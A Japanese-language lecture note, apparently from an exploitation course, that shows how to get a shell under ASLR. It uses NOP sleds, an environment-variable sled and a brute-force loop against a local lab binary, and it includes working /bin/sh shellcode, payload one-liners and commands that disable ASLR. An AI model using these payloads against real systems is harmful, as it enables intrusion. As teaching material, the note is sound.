# ASLR 下でのシェルコード注入

前の[講義](../Lecture2/README.md)では、ASLR が無効なときのシェルコードの注入を扱いました。ASLR は、各セグメントのアドレスをランダム化します。そのため、バッファのアドレスを特定するのは簡単ではありません。バッファのアドレスは、プログラムを実行するたびに変わり続けます。したがって、戻りアドレスが(変わり続ける)バッファのアドレスを指すようにして、実行可能なシェルコードをメモリに置くのは、それほど簡単ではありません。

ASLR を無効にするには、
`echo "0" | sudo dd of=/proc/sys/kernel/randomize_va_space`
有効にするには、
`echo "2" | sudo dd of=/proc/sys/kernel/randomize_va_space`

#### シナリオ 1: `nop - \x90` sled を使う
シェルコードの前に、いくつかの `nop`(何もしない命令)を付け足したとします。

#### NOP
> In computer science, a NOP, no-op, or NOOP (pronounced "no op"; short for no operation) is an assembly language instruction, programming language statement, or computer protocol command that does nothing.

シェルコードの前に20個の `nop` を付け足したとします。
`python -c 'import struct;shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; bufferlen=108; print "\x90"*20+shellcode+"\x90"*(bufferlen-len(shellcode)-20)+"BBBB"+struct.pack("<I", starting address of the buffer)'`
そして、戻りアドレスが、バッファの開始アドレスからシェルコードの開始アドレス(バッファのアドレス + 20)までの **21** か所のどれかを指すようにすれば、確かにシェルを起動できます。しかし、**その確率はどれくらいでしょうか。** つまり、戻りアドレス(バッファのアドレスにほかなりません)が、それらの場所のどれかに収まる確率です。確率が高いほど、exploit が成功する可能性も高くなります。

バッファの開始アドレスは `0xff_ _ _ _ _ _ _` の形になります。バッファはメモリの上位の領域にあるので、先頭の `0xff` は固定です。
これを試すために、単純な C プログラムを作ります。
```C
int main()
{
    int a;
    printf("%p\n", &a);
    return 0;
}
```
このプログラムをコンパイルして、たとえば10回実行します。
```bash
$ for i in {1..10};do ./a.out;done
0xffe918bc
0xffdc367c
0xffeaf37c
0xffc31ddc
0xffc6a56c
0xffbcf9bc
0xffbcf02c
0xffbf1dcc
0xfffe386c
0xff9547cc
```
観察の結果は、想定したとおりです。納得できなければ、さらに多くの回数で試してください。
変数は、実行のたびにスタック上の異なるアドレスに読み込まれるようです。アドレスは 0xffXXXXXc(X は任意の16進数の桁)と表せます。さらに試すと、最後の半バイト(ここでは ‘c’)さえ、プログラム内での変数の相対的な位置に依存することがわかります。したがって一般に、スタック上の変数のアドレスは 0xffXXXXXX です。これは 16^6 = 16777216 通りになります。上で述べたスタックの exploit 方法が成功する確率は、21/16777216 しかないことがすぐにわかります(21 は NOP slide の長さで、書き換えた戻りアドレスがたまたまそれらの NOP バイトのどれかにあたれば、シェルコードが実行されます)。
つまり平均すると、約4万回に1回しかシェルコードが実行されません。これではあまりにも少なすぎます。いずれにせよ、バッファ上の `nop` sled をどうにかして長くする必要があるというヒントは得られましたが、バッファの長さには限りがあります。`nop` を増やせば、シェルコードが実行される可能性は高まります。ではどうするのでしょうか。

**環境変数** の助けを借りてはどうでしょうか。

#### シナリオ 2: 長いシェルコードを環境変数に入れる
私の vagrant のシステムでは、環境変数をバッファのサイズよりはるかに長くできます。私のシステムは、長さ100Kの環境変数を許可します。環境変数を選ぶ理由は、環境変数そのものがスタックのすぐ上に読み込まれるからです。
たとえば `SHELLCODE` という環境変数を作ります。
`export SHELLCODE=$(python -c 'print "\x90"*100000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"')
`
そして、戻りアドレスをバッファの開始アドレスにする代わりに、ランダムに選んだ上位のメモリアドレスのどれかにします。たとえば、最上位のアドレス `0xffffffff` と `0xff9547cc` の間のどれかのアドレスです。ここでは `0xff882222` を選びます。

`$ for i in {1..100}; do ./exploit_me_3 $(python -c 'import struct;print "A"*112 + struct.pack("<I", 0xff882222)'); done`

```bash
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
Segmentation fault
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
Segmentation fault
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
Segmentation fault
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
Segmentation fault
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
$whoami
vagrant
```

数回試すと、シェルが得られました。:cool: すごいでしょう!

